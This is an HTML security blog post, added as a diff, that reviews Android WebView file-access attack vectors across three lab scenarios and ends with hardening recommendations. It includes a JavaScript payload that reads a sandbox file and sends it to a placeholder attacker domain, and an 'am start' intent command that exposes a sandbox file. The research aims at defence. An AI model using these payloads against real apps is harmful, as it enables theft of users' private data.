@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    <title>Reviewing Android Webviews File Access Attack Vectors &middot; March Of The Bits</title>
+    <meta name="author" content="Cláudio André">
+    <meta name="description" content="My infosec posts.">
+    <meta name="generator" content="Hugo 0.25.1" />
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <!-- RSS autodiscovery -->
+    
+
+    <link rel="shortcut icon" href="https://security.claudio.pt/img/favicon.ico">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://security.claudio.pt/css/screen.css">
+    <link rel="stylesheet" href="https://security.claudio.pt/css/github.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/styles/default.min.css">
+    
+
+    
+    <link rel="shortcut icon" type="image/x-icon" href="https://security.claudio.pt/favicon.ico">
+    <link rel="icon" type="image/x-icon" href="https://security.claudio.pt/favicon.ico">
+    
+
+    <!-- Stylesheet for theme color -->
+    <style type="text/css">
+    a, a:visited {color: #f05948;}
+    .pagination a {color: #f05948;}
+    .gist .gist-file .gist-meta a:visited {color: #f05948 !important;}
+    a:focus, a:hover {color: #c62310;}
+    h1.post-title a:focus, h1.post-title a:hover, h1.blog-title a:focus, h1.blog-title a:hover {color: #c62310;}
+    .older-posts:hover, .newer-posts:hover {color: #c62310;}
+</style>
+</head>
+
+<body class="home-template">
+    <header id="site-head">
+	
+	<h1 class="blog-title"><a href="https://security.claudio.pt/">March Of The Bits</a></h1>
+	
+	
+	<h1 class="blog-subtitle">My infosec posts.</h1>
+	
+</header>
+    
+    
+    <main class="content" role="main">
+    
+<article class="post">
+    <header>
+        <h1 class="post-title">Reviewing Android Webviews File Access Attack Vectors</h1>
+        <div class="post-meta">
+            <time datetime="15 May 2018">
+                15 May 2018
+            </time>
+        </div>
+    </header>
+
+    <section class="post-content">
+        
+
+<h2 id="introduction">Introduction</h2>
+
+<p><em>WebViews</em> are a crucial part of many mobile applications and there are some security aspects that need to be taken into account when using them. File access is one of those aspects. For the implementation of some checks in our security tool <a href="https://github.com/integrity-sa/droidstatx/"><em>Droidstatx</em></a>, I&rsquo;ve spent some time understanding all the details and noticed that not all attack vectors are very clear, specially in their requirements.</p>
+
+<p><em>WebView</em> file access is enabled by default. Since API 3 (Cupcake 1.5) the method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess(boolean)"><em>setAllowFileAccess()</em></a> is available for explicitly enabling or disabling it.</p>
+
+<p>A <em>WebView</em> with file access enabled will be able to access all the same files as the embedding application, such as the application sandbox (located in /data/data/&lt;package_name&gt;), /etc, /sdcard, among others. Above API 19(KitKat 4.4 - 4.4.4), the app will need the <em>android.permission.READ_EXTERNAL_STORAGE</em> permission.</p>
+
+<p>The <em>WebView</em> needs to use a File URL Scheme, e.g.,  <code>file://path/file</code>, to access the file.</p>
+
+<p>Another important detail is that <em>WebViews</em> have <em>Javascript</em> disabled by default. The method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setJavaScriptEnabled(boolean)"><em>setJavaScriptEnabled()</em></a> is available for explicitly enabling or disabling it..</p>
+
+<p>Before going  into details regarding the type of attack vectors that are made possible with file access, one needs to be aware of another concept, Same Origin Policy (SOP):</p>
+
+<blockquote>
+<p>A web browser permits scripts contained in a first web page to access data in a second web page, but only if both web pages have the same origin. An origin is defined as a combination of URI scheme, host name, and port number. in <a href="https://en.wikipedia.org/wiki/Same-origin_policy">https://en.wikipedia.org/wiki/Same-origin_policy</a></p>
+</blockquote>
+
+<p>As an example, the URLs <a href="https://www.integrity.pt">https://www.integrity.pt</a> and file://etc/hosts do not have the same origin since they won’t match in:</p>
+
+<ul>
+<li>Scheme: HTTPS vs file</li>
+<li>Authority: www.integrity.pt vs etc/hosts</li>
+</ul>
+
+<p>This means that a file request in the context of the <a href="https://www.integrity.pt">https://www.integrity.pt</a> loaded contents will be considered a Cross Origin Request (COR).</p>
+
+<h2 id="attack-vectors">Attack Vectors</h2>
+
+<p>So we have a <em>WebView</em> with file access. Now what? As an attacker we want data exfiltration and this is what motivated me to write this article because there are details that can invalidate this type of attack.</p>
+
+<h3 id="scenario-1-app-with-webview-that-loads-resources-which-the-attacker-is-able-to-intercept-and-manipulate-javascript-enabled">Scenario 1: App with <em>WebView</em> that loads resources which the attacker is able to intercept and manipulate. <em>Javascript</em> enabled.</h3>
+
+<p>In this scenario, an attacker is able to intercept the communication of the app and is able to manipulate the content. Our goal is to exfiltrate content from the app so our best option is to use <em>Javascript</em> to do so. Using an <em>XMLHttpRequest</em> seems the best way to do that.</p>
+
+<p>The attacker can try and replace the content returned to the app with a <em>Javascript</em> payload that would seemingly allow to exfiltrate files:</p>
+
+<pre><code class="language-javascript">var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+ if (xhr.readyState == XMLHttpRequest.DONE) {
+ window.location.replace('https://attackerdomain.com/?exfiltrated='+xhr.responseText); 
+}
+}
+xhr.open('GET', 'file:///data/data/pt.integrity.labs.webview_remote/files/sandbox_file.txt', true);
+xhr.send(null);
+</code></pre>
+
+<p>The attacker will be able to see the HTTP request but without exfiltrated data. If we look into the system logs we discover why.</p>
+
+<blockquote>
+<p>05-09 12:38:59.306 27768 27768 I chromium: [INFO:CONSOLE(20)] &ldquo;Failed to load file:///data/data/pt.integrity.labs.webview_remote/files/sandbox_file.txt: Cross origin requests are only supported for protocol schemes: http, data, chrome, https.&ldquo;, source: <a href="https://labs.integrity.pt/">https://labs.integrity.pt/</a> (20)</p>
+</blockquote>
+
+<p>On earlier API versions like 15 (Ice Cream Sandwich 4.0.3 - 4.0.4) a similar error is returned:</p>
+
+<blockquote>
+<p>Console: XMLHttpRequest cannot load file:///data/data/pt.integrity.labs.webview_remote/files/sandbox_file.txt. Cross origin requests are only supported for HTTP. null:1 Console: Uncaught Error: NETWORK_ERR: XMLHttpRequest Exception 101 <a href="https://labs.integrity.pt/:39">https://labs.integrity.pt/:39</a></p>
+</blockquote>
+
+<p>So even with file access enabled in the <em>WebView</em>, due to the fact that the file scheme request is considered a Cross Origin Request and hence disallowed, the attacker will not be able to exfiltrate files this way.</p>
+
+<h3 id="scenario-2-app-with-webview-that-loads-local-html-files-via-file-scheme-with-external-resources-which-the-attacker-is-able-to-intercept-and-manipulate-javascript-enabled">Scenario 2: App with <em>WebView</em> that loads local HTML files via file scheme with external resources which the attacker is able to intercept and manipulate. <em>Javascript</em> enabled.</h3>
+
+<p>In this scenario, the HTML files are stored locally in the APK and are loaded via file scheme, but some resources are loaded externally.</p>
+
+<p>There is a very important property called <em>UniversalAccessFromFileURLs</em> that allows SOP bypass. This property indicates whether <em>Javascript</em> running in the context of a file scheme can access content from any origin. This property is enabled by default below API 16 (Jelly Bean 4.1.x) and there is no way to disable it on those API levels [<a href="#note1">1</a>].  In API 16 (Jelly Bean 4.1.x) and afterwards the property is disabled by default. The method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowUniversalAccessFromFileURLs(boolean)"><em>setAllowUniversalAccessFromFileURLs()</em></a> was also made available to explicitly enable or disable this feature.</p>
+
+<p>Using the same <em>Javascript</em> payload, the attack will succeed in devices that are running on API 15 and below, or in apps that explicitly enable the property using the method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowUniversalAccessFromFileURLs(boolean)"><em>setAllowUniversalAccessFromFileURLs()</em></a>.</p>
+
+<p>The attack succeeds due to the fact that the app is running Javascript in the context of an HTML file loaded with a file scheme and the <em>UniversalAccessFromFileURLs</em> property is enabled, allowing SOP bypass.</p>
+
+<h3 id="scenario-3-app-with-exported-component-that-opens-urls-via-intent-backup-disabled-access-to-external-storage">Scenario 3: App with exported component that opens URLs via <em>Intent</em>. Backup disabled. Access to External Storage.</h3>
+
+<p>In this scenario, the app has an exported activity, then receives URLs via <em>Intents</em>, and opens the respective URL. This is very common in apps that are using <em>Deep Links</em>. When intent-filters are not correctly implemented this can cause security issues.</p>
+
+<p>The app also has <em>Backup</em> disabled, preventing an attacker to obtain access to the app’s sandbox content via the backup file.</p>
+
+<p>Here the attack vectors are a bit trickier and far-fetched, but still possible.</p>
+
+<h4 id="scenario-3-physical-attack">Scenario 3 - Physical Attack</h4>
+
+<p>One possible attack vector is someone that has physical access to a unlocked device, already knows in advanced the structure of the vulnerable app (consider an hypothetical well known app, with a large user base), and session cookies or plaintext credentials are stored in the app’s sandbox.</p>
+
+<p>The attacker can install a custom app sending a targeted <em>Intent</em> for the file with sensitive information or install a terminal emulator from Google Play and type in the following command:</p>
+
+<blockquote>
+<p>am start -n pt.integrity.labs.webview_intents/.ExportedActivity &ndash;es url &ldquo;file:///data/data/pt.integrity.labs.webview_intents/files/sandbox_file.txt&rdquo;</p>
+</blockquote>
+
+<p>This will trigger the vulnerable app and the <em>WebView</em> is going to show the content of the sensitive file on the screen. Without rooting the device it is possible to obtain access to the content of the app’s sandbox.</p>
+
+<h4 id="scenario-3-malicious-app">Scenario 3 - Malicious App</h4>
+
+<p>This attack requires that the vulnerable app is running on a device below API 16 or the app has explicitly enabled <em>UniversalAccessFromFileURLs</em></p>
+
+<p>An attacker lures the user to install a malicious app that only needs <em>android.permission.INTERNET</em> and <em>android.permission.READ_EXTERNAL_STORAGE</em> permissions.</p>
+
+<p>When started, the malicious app creates an HTML file in the external storage with a <em>Javascript</em> payload identical to the one used in scenarios 1 and 2. Afterwards, it sends an <em>Intent</em> to the vulnerable app containing the URL of the local HTML (previously created in the external storage). This will allow it to exfiltrate the information from inside the vulnerable app’s sandbox like in scenario 2.</p>
+
+<h2 id="test-apps">Test Apps</h2>
+
+<p>I&rsquo;ve created the apps for all scenarios so you can play around and test this for yourselves.</p>
+
+<ul>
+<li>Scenario 1 - <a href="https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_remote_scenario1.apk">https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_remote_scenario1.apk</a></li>
+<li>Scenario 2 - <a href="https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_local_scenario2.apk">https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_local_scenario2.apk</a></li>
+<li>Scenario 3 - <a href="https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_intents_scenario3.apk">https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_intents_scenario3.apk</a></li>
+<li>Scenario 3 Exploit App - <a href="https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_intents_scenario3_exploit.apk">https://github.com/integrity-sa/android-webviews-fileaccess/blob/master/webview_intents_scenario3_exploit.apk</a></li>
+</ul>
+
+<p>Note1: All apps have broken TLS implementation so it&rsquo;s easier to intercept the communication. If using Burp Suite, for scenario 2, ensure that you adjust the Intercept Client Requests rules so that you can intercept <em>Javascript</em> content.</p>
+
+<p>Note2: While exploring the vulnerability in Scenario 2 and 3 (both vulnerable app and exploit) you will need to clear the data (Settings-&gt;Apps-&gt;App-&gt;Clear Data) when trying to repeat the attack.</p>
+
+<p>Note3: On Scenario 3 Malicious App, start the vulnerable app a first time and only then run the exploit app.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p><em>WebViews</em> with file access enabled can have a big impact in a particular application’s security but, by itself, a <em>WebView</em> with file access enabled does not guarantee a practical way to exfiltrate files from the system. For the attack to work it is required that the app is running on a device with API level &lt; 16 and/or the app developer improperly used the Android platform as demonstrated in some of the  scenarios above.</p>
+
+<p>These were the attack vectors that I could identify but if I missed a particular one, I would love to discuss it and add it here. Ping me at <a href="https://twitter.com/clviper">https://twitter.com/clviper</a>.</p>
+
+<p>Recommendations:</p>
+
+<ul>
+<li>Ensure that all external external resources loaded by a <em>WebView</em> are using TLS and the app has a correct TLS implementation.</li>
+<li>Ensure that all exported components that might need to receive intents and trigger a <em>WebView</em> to open that URL are correctly filtered by using intent-filters and a data element for a fine filter of the allowed URIs.</li>
+<li>Ensure that all <em>WebViews</em> explicitly disable file access when not a requirement by using the method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowFileAccess(boolean)"><em>setAllowFileAccess()</em></a>.</li>
+<li>In API Level &gt;=16, when not a requirement, ensure that no <em>WebView</em> enables the <em>UniversalAccessFromFileURLs</em> by using the method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowUniversalAccessFromFileURLs(boolean)"><em>setAllowUniversalAccessFromFileURLs()</em></a>.</li>
+</ul>
+
+<h2 id="references">References</h2>
+
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Same-origin_policy">https://en.wikipedia.org/wiki/Same-origin_policy</a></li>
+<li><a href="https://source.android.com/setup/start/build-numbers">https://source.android.com/setup/start/build-numbers</a></li>
+<li><a href="https://developer.android.com/reference/android/webkit/WebView">https://developer.android.com/reference/android/webkit/WebView</a></li>
+<li><a href="https://developer.android.com/reference/android/webkit/WebSettings">https://developer.android.com/reference/android/webkit/WebSettings</a></li>
+<li><a href="https://developer.android.com/guide/components/intents-filters">https://developer.android.com/guide/components/intents-filters</a></li>
+<li><a href="https://developer.android.com/guide/topics/manifest/data-element">https://developer.android.com/guide/topics/manifest/data-element</a></li>
+<li><a href="https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-webview-protocol-handlers">https://github.com/OWASP/owasp-mstg/blob/master/Document/0x05h-Testing-Platform-Interaction.md#testing-webview-protocol-handlers</a></li>
+</ul>
+
+<h2 id="notes">Notes</h2>
+
+<p>[1] Currently the Android developer documentation has the following paragraph:</p>
+
+<blockquote>
+<p>To prevent possible violation of same domain policy when targeting ICE_CREAM_SANDWICH_MR1 and earlier, you should explicitly set this value to false.</p>
+</blockquote>
+
+<p>I&rsquo;ve opened an issue on google issue tracker, since this paragraph needs to be adjusted. The public method <a href="https://developer.android.com/reference/android/webkit/WebSettings.html#setAllowUniversalAccessFromFileURLs(boolean)"><em>setAllowUniversalAccessFromFileURLs()</em></a> was only implemented in API 16, so it is not possible to use this method in API 15 (ICE_CREAM_SANDWICH_MR1) and earlier.</p>
+
+<h2 id="thank-you">Thank you</h2>
+
+<p>Special thank you to pmsac and morisson for the post review.</p>
+
+    </section>
+
+    
+    <section class="post-tags" style="padding-bottom:60px;">
+        <div class="post-meta tags">
+            <i class="fa fa-fw fa-tag"></i>
+            
+        </div>
+    </section>
+    
+    <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "security-claudio-pt" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+    <section class="share">
+    <p class="backtotop"><a data-scroll href="#site-head"><i class="fa fa-lg fa-fw fa-angle-double-up"></i></a><a data-scroll class="backtotoptext" href="#site-head"> Back to top</a></p>
+    <p class="info prompt">Share</p>
+    <a href="http://twitter.com/share?text=Reviewing%20Android%20Webviews%20File%20Access%20Attack%20Vectors&url=https%3a%2f%2fsecurity.claudio.pt%2fpost%2freviewwebviewfileaccess%2f" title="Share on Twitter"
+        onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="fa fa-2x fa-fw fa-twitter-square"></i> <span class="hidden">Twitter</span>
+    </a>
+    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsecurity.claudio.pt%2fpost%2freviewwebviewfileaccess%2f" title="Share on Facebook"
+        onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="fa fa-2x fa-fw fa-facebook-square" style="margin-left: -8px"></i> <span class="hidden">Facebook</span>
+    </a>
+    <a href="https://plus.google.com/share?url=https%3a%2f%2fsecurity.claudio.pt%2fpost%2freviewwebviewfileaccess%2f" title="Share on Google+"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <i class="fa fa-2x fa-fw fa-google-plus-square" style="margin-left: -8px"></i> <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    <footer class="post-footer">
+        <section class="author">
+    <div class="authorimage" style="background: url(https://security.claudio.pt/img/avatar.jpg)"></div>
+    <h4>Cláudio André</h4>
+    <p class="bio">Security Learner. Hobbyist Photographer.</p>
+    <p class="meta">
+      
+    </p>
+</section>
+    </footer>
+    
+</article>
+
+    </main>
+
+    <footer class="site-footer">
+	<div class="inner">
+		<section class="footer-social">
+      
+      <a href="//twitter.com/clviper" target="_blank" title="Twitter"><i class="fa fa-2x fa-fw fa-twitter"></i> <span class="hidden">Twitter</span></a>&nbsp;
+      
+      
+      
+      
+      
+      
+      <a href="//github.com/clviper" target="_blank" title="GitHub"><i class="fa fa-2x fa-fw fa-github"></i> <span class="hidden">GitHub</span></a>&nbsp;
+      
+      
+      
+      
+  </section>
+
+		<section class="copyright">&copy; 2018 <a href="https://security.claudio.pt/">Cláudio André</a>. </section>
+	</div>
+</footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="https://security.claudio.pt/js/index.js"></script>
+<script src="https://security.claudio.pt/js/smooth-scroll.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js"></script>
+
+
+<script>
+    smoothScroll.init({
+        speed: 800,
+        easing: 'easeInOutCubic',
+        updateURL: false,
+        offset: 125,
+    });
+</script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+<script>
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-65729916-1', 'auto');
+ga('send', 'pageview');
+</script>
+
+</body>
+</html>
